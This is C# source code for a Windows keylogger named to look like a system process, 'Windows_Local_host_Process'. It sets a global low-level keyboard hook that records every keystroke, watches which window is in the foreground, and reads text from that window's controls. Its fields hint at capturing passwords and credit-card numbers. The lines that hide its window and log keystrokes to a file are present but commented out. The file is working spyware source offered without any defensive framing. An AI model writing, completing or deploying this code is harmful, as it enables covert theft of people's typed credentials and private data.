using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;


namespace Windows_Local_host_Process
{
    class Program
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private int passCharsInRow = 0;
        private int ccCharsInRow = 0;

        public static void Main()
        {
            var handle = GetConsoleWindow();

            // Hide
            ShowWindow(handle, SW_SHOW);/// SW_HIDE);

            _hookID = SetHook(_proc);
            WinEventDelegate dele = new WinEventDelegate(WinEventProc);
            IntPtr m_hhook = SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, IntPtr.Zero, dele, 0, 0, WINEVENT_OUTOFCONTEXT);
            Application.Run();

            UnhookWindowsHookEx(_hookID);

        }

        delegate void WinEventDelegate(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);
        [DllImport("user32.dll")]
        static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, WinEventDelegate lpfnWinEventProc, uint idProcess, uint idThread, uint dwFlags);

        private const uint WINEVENT_OUTOFCONTEXT = 0;
        private const uint EVENT_SYSTEM_FOREGROUND = 3;

        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        private static string GetActiveWindowTitle()
        {
            const int nChars = 256;
            IntPtr handle = IntPtr.Zero;
            StringBuilder Buff = new StringBuilder(nChars);
            handle = GetForegroundWindow();

            if (GetWindowText(handle, Buff, nChars) > 0)
            {
                return Buff.ToString();
            }
            return null;
        }

        public static void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
           // Console.WriteLine(GetActiveWindowTitle());
           StringBuilder sb = new StringBuilder(1024);
            //StringBuilder sb = new StringBuilder(1024);
            //GetClassName(hwnd, sb, sb.Capacity);
            uint WM_GETTEXT = 0x000D;
           SendMessage3(hwnd, WM_GETTEXT, 1024, sb);
           Console.WriteLine(sb.ToString());
           List<IntPtr> list = GetAllChildrenWindowHandles(hwnd, 100);
           for (int i = 0; i < list.Count; ++i)
           {
               IntPtr hControl = list[i];
               string caption = GetTextBoxText(hControl);
               Console.WriteLine(caption);
           }
        }

        static int GetTextBoxTextLength(IntPtr hTextBox)
        {
            // helper for GetTextBoxText
            uint WM_GETTEXTLENGTH = 0x000E;
            int result = SendMessage4(hTextBox, WM_GETTEXTLENGTH,
              0, 0);
            return result;
        }

        static string GetTextBoxText(IntPtr hTextBox)
        {
            uint WM_GETTEXT = 0x000D;
            int len = GetTextBoxTextLength(hTextBox);
            if (len <= 0) return null;  // no text
            StringBuilder sb = new StringBuilder(len + 1);
            SendMessage3(hTextBox, WM_GETTEXT, len + 1, sb);
            return sb.ToString();
        }

        [DllImport("user32.dll", EntryPoint = "SendMessage",  CharSet = CharSet.Auto)]
        static extern int SendMessage3(IntPtr hwndControl, uint Msg,
          int wParam, StringBuilder strBuffer); // get text

        [DllImport("user32.dll", EntryPoint = "SendMessage",  CharSet = CharSet.Auto)]
        static extern int SendMessage4(IntPtr hwndControl, uint Msg,
          int wParam, int lParam);  // text length
        [DllImport("user32.dll", EntryPoint = "FindWindowEx",
  CharSet = CharSet.Auto)]
        static extern IntPtr FindWindowEx(IntPtr hwndParent,
          IntPtr hwndChildAfter, string lpszClass, string lpszWindow);
        static List<IntPtr> GetAllChildrenWindowHandles(IntPtr hParent,
  int maxCount)
        {
            List<IntPtr> result = new List<IntPtr>();
            int ct = 0;
            IntPtr prevChild = IntPtr.Zero;
            IntPtr currChild = IntPtr.Zero;
            while (true && ct < maxCount)
            {
                currChild = FindWindowEx(hParent, prevChild, null, null);
                if (currChild == IntPtr.Zero) break;
                result.Add(currChild);
                prevChild = currChild;
                ++ct;
            }
            return result;
        }

        private static string keysToChars(Keys _key) {
            bool CapsLock = Control.IsKeyLocked(Keys.CapsLock);
            bool ShiftLock = Control.ModifierKeys.Equals(Keys.Shift);

            string toReturn = mapping(_key);

            if (ShiftLock)
            switch (_key) { 
                case Keys.D1:
                    toReturn = "!";
                    break;
                case Keys.D2:
                    toReturn = "@";
                    break;
                case Keys.D3:
                    toReturn = "#";
                    break;
                case Keys.D4:
                    toReturn = "$";
                    break;
                case Keys.D5:
                    toReturn = "%";
                    break;
                case Keys.D6:
                    toReturn = "^";
                    break;
                case Keys.D7:
                    toReturn = "&";
                    break;
                case Keys.D8:
                    toReturn = "*";
                    break;
                case Keys.D9:
                    toReturn = "(";
                    break;
                case Keys.D0:
                    toReturn = ")";
                    break;
                case Keys.OemOpenBrackets:
                    toReturn = "{";
                    break;
                case Keys.OemMinus:
                    toReturn = "_";
                    break;
                case Keys.Oemplus:
                    toReturn = "+";
                    break;
                case Keys.Oem6:
                    toReturn = "}";
                    break;
                case Keys.Oem1:
                    toReturn = ":";
                    break;
                case Keys.Oem7:
                    toReturn = "\"";
                    break;
                case Keys.Oem5:
                case Keys.OemBackslash:
                    toReturn = @"|";
                    break;
                case Keys.Oemcomma:
                    toReturn = "<";
                    break;
                case Keys.OemPeriod:
                    toReturn = ">";
                    break;
                case Keys.OemQuestion:
                    toReturn = @"?";
                    break;
                case Keys.Oemtilde:
                    toReturn = @"~";
                    break;
                default:
                    break;

            };
            
            CapsLock = (CapsLock && !ShiftLock) || (!CapsLock && ShiftLock);

            return CapsLock ? toReturn.ToUpper() : toReturn.ToLower();
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                    GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
               
                Keys pressed = (Keys)Marshal.ReadInt32(lParam);
                Console.WriteLine(keysToChars(pressed));
                //StreamWriter sw = new StreamWriter(Application.StartupPath + @"\log.txt", true);
                //sw.Write(keysToChars(pressed));
                //sw.Close();
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static string mapping(Keys _key)
        {
            switch (_key)
            {
                case Keys.OemOpenBrackets:
                    return "[";
                case Keys.OemMinus:
                    return "-";
                case Keys.Oemplus:
                    return "=";
                case Keys.Oem6:
                    return "]";
                case Keys.Oem1:
                    return ";";
                case Keys.Oem7:
                    return @"'";
                case Keys.Oem5:
                case Keys.OemBackslash:
                    return @"\";
                case Keys.Oemcomma:
                    return ",";
                case Keys.OemPeriod:
                    return ".";
                case Keys.OemQuestion:
                    return @"/";
                case Keys.Oemtilde:
                    return @"`";
                case Keys.Subtract:
                    return "-";
                case Keys.Decimal:
                    return ".";
                case Keys.Add:
                    return "+";
                case Keys.Divide:
                    return @"/";
                case Keys.Multiply:
                    return "*";
                case Keys.NumPad0:
                    return "0";
                case Keys.NumPad1:
                    return "1";
                case Keys.NumPad2:
                    return "2";
                case Keys.NumPad3:
                    return "3";
                case Keys.NumPad4:
                    return "4";
                case Keys.NumPad5:
                    return "5";
                case Keys.NumPad6:
                    return "6";
                case Keys.NumPad7:
                    return "7";
                case Keys.NumPad8:
                    return "8";
                case Keys.NumPad9:
                    return "9";
                case Keys.Space:
                    return " ";
                case Keys.Control:
                case Keys.Clear:
                case Keys.Home:
                case Keys.Insert:
                case Keys.Enter:
                case Keys.Escape:
                case Keys.Down:
                case Keys.Up:
                case Keys.Left:
                case Keys.Right:
                case Keys.PageDown:
                case Keys.PageUp:
                case Keys.End:
                case Keys.F1:
                case Keys.F2:
                case Keys.F3:
                case Keys.F4:
                case Keys.F5:
                case Keys.F6:
                case Keys.F7:
                case Keys.F8:
                case Keys.F9:
                case Keys.F10:
                case Keys.F11:
                case Keys.F12:
                case Keys.PrintScreen:
                case Keys.Pause:
                case Keys.LWin:
                case Keys.ShiftKey:
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.CapsLock:
                    return "";
                default:
                    return (new KeysConverter()).ConvertToString(_key);
            };
        }
        #region DLL Imports


        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook,
            LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
            IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);


        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

        [DllImport("user32.dll")]
        static extern int SendMessage(IntPtr hWnd, int msg, int wParam, int lParam);
 
       

        #endregion


        #region private Attributes
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        private StringBuilder strBuilder = new StringBuilder(0, 16);

        

        #endregion

    }
}
